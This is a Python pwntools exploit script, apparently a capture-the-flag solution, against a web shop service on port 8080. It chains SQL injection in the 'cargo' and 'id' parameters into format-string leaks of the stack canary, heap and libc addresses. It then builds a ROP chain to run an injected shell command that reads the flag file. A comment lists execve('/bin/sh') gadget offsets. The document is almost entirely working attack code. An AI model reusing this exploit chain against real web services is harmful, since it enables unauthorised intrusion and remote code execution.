from pwn import *
ip = "127.0.0.1"


def build_rop(libc_addr,heap):
	rop = ''
	rop += p64(libc_addr + 0x0000000000021102)

	rop += p64(heap+392)	
	rop += p64(libc_addr + 283536)	
	#rop += p64(libc_addr + 0x0000000000021102)
	#rop += p64(heap+415)
	#rop += p64(libc_addr + 0x000000000003a7a0)
	#rop += p64(1)
	#0x000000000003a7a0 : mov dword ptr [rdi], 0 ; xor eax, eax ; pop rbx ; ret
	#rop += p64(libc_addr + 0x00000000000202e8)
	#rop += p64(1)
	#rop += p64(libc_addr + 0x0000000000001b92)
	#rop += p64(1)
	
	#rop += p64(libc_addr + 586160)	
	'''
	rop += p64(libc_addr + 0x0000000000021102)

	rop += p64(heap+392)	
	rop += p64(libc_addr + 0x6f690)	
	'''
	#rop += p64(libc_addr + 0x6f690)	
	'''
	rop += p64(libc_addr + 0x0000000000021102)
	rop += p64(heap+390)
	rop += p64(libc_addr + 0x6f690)	
	'''


	#0x0000000000021102 : pop rdi ; ret
	#0x00000000000202e8 : pop rsi ; ret
	#0x0000000000001b92 : pop rdx ; ret
	#rop += p64(libc_addr+0x45216)
	# strncpy 0x8d3c0
	a = "unhex('%s')"%rop.encode('hex')
	return a
p = remote(ip,8080)	
buf ="""POST /cart.html?cargo=-1); HTTP/1.1\r
Host: 127.0.0.1\r
User-Agent: ComputerVendor\r
Cookie: nilnilnilnil\r
Connection: close\r
Identity: unknown\r
Content-Length: 10\r
\r
a=1&cargo=1) union select '%41$p' ;# &"""
context.log_level = 'debug'
p.send(buf)
p.recvuntil('</html>')
canary = int(p.recvuntil('00'),16)
print '[+]canary',hex(canary)

p = remote(ip,8080)	
buf ="""POST /cart.html?cargo=-1); HTTP/1.1\r
Host: 127.0.0.1\r
User-Agent: ComputerVendor\r
Cookie: nilnilnilnil\r
Connection: close\r
Identity: unknown\r
Content-Length: 10\r
\r
a=1&cargo=1) union select '%44$p' ;# &"""
context.log_level = 'debug'
p.send(buf)
p.recvuntil('</html>')
stack = int(p.recv(14),16)
print '[+]canary',hex(stack)
p = remote(ip,8080)	
buf ="""POST /cart.html?cargo=-1); HTTP/1.1\r
Host: 127.0.0.1\r
User-Agent: ComputerVendor\r
Cookie: nilnilnilnil\r
Connection: close\r
Identity: unknown\r
Content-Length: 10\r
\r
a=1&cargo=1) union select '%7$p' ;# &"""
context.log_level = 'debug'
p.send(buf)
p.recvuntil('</html>')
heap = int(p.recv(),16)
#raw_input()
print '[+]heap',hex(heap)

p = remote(ip,8080)

p = remote(ip,8080)


buf ="""POST /cart.html?cargo=-1); HTTP/1.1\r
Host: 127.0.0.1\r
User-Agent: ComputerVendor\r
Cookie: nilnilnilnil\r
Connection: close\r
Identity: unknown\r
Content-Length: 10\r
\r
a=1&cargo=1) union select '%75$p' ;# &"""
context.log_level = 'debug'
p.send(buf)
p.recvuntil('</html>')
libc_addr = int(p.recvuntil('30'),16)-0x20830
print '[+]libc_addr',hex(libc_addr)

p = remote(ip,8080)

buf ="""POST /cart.html?product.html HTTP/1.1\r
Host: 127.0.0.1\r
User-Agent: ComputerVendor\r
Cookie: nilnilnilnil\r
Connection: close\r
Identity: unknown\r
Content-Length: 100\r
\r
a=1&id=1&"""
context.log_level = 'debug'
p.send(buf)
p.recvuntil('</html>')

p = remote(ip,8080)

buf ="""POST /product.html? HTTP/1.1\r
Host: 127.0.0.1\r
User-Agent: ComputerVendor\r
Cookie: nilnilnilnil\r
Connection: close\r
Identity: unknown\r
Content-Length: 100\r
\r
a=1&id=111 union select 'overdueaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa','%s',%s,'cat /opt/xnuca/flag.txt;echo ';#'&"""%(p64(canary).replace('\0','')+'aaaaaaaaaaaaaaaaaaaaaaa',build_rop(libc_addr,heap) )#p64(libc_addr+0x45216).replace('\0',''))
#context.log_level = 'debug'
p.send(buf)
#p.recvuntil('</html>')
#print '[+]',p64(canary)[1:]
#print '[+++]',len(buf)
p.recvuntil('cat /opt/xnuca/flag.txt;echo aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')
flag = p.recvline()
print '[+] flag',flag
p.interactive()


'''
0x0000000000021102 : pop rdi ; ret
0x00000000000202e8 : pop rsi ; ret
0x0000000000001b92 : pop rdx ; ret
0x6f690 puts\
0x18cd57 /bin/sh
0x45216	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4	execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

'''